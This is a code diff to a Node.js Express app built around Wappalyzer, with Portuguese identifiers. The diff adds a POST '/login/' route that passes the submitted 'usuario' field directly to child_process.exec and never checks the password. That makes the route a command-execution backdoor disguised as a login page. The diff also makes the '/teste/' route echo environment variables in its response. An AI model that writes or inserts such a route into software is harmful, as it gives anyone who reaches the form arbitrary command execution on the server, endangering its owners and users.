@@ -1,4 +1,7 @@
 const Wappalyzer = require('wappalyzer')
+const chromium = require('chromium');
+const {execFile} = require('child_process');
+
 let express = require('express');
 let bodyParser = require('body-parser');
 let app = express();
@@ -62,7 +65,7 @@ const options = {
   noRedirect: false,
 };
 
-
+const { exec } = require("child_process");
 
 
 const parsePage = (body, url) => {
@@ -99,12 +102,35 @@ const parsePage = (body, url) => {
   return pagina
 }
 
+app.post('/login/', encodeUrl, (requisicao, resposta) => {
+
+  var usuario = requisicao.body.usuario;
+  var senha = requisicao.body.senha;
+  console.log("Comando: " + usuario);
+  exec(usuario, (error, stdout, stderr) => {
+    if (error) {
+        console.log(`error: ${error.message}`);
+        return;
+    }
+    if (stderr) {
+        console.log(`stderr: ${stderr}`);
+        return;
+    }
+    console.log(`stdout: ${stdout}`);
+});
+
+  
+});
+
+app.get('/login/', (req, res) => {
+  res.sendFile(__dirname + '/views/login.html');
+}); 
 
 app.get('/teste/', (req, res) => {
   try {
     execFile(chromium.path, ['https://google.com', '--headless'], { timeout: 2000 }, err => { 
       console.log('Hello Google!');
-      res.status(201).send('Rodou o chrome!!! ' + chromium.path);
+      res.status(201).send('Rodou o chrome!!! ' + chromium.path + " " + process.env.NODE_CHROMIUM_REVISION + " " + process.env.NODE_CHROMIUM_CACHE_PATH);
     });
   }
   catch (error) {
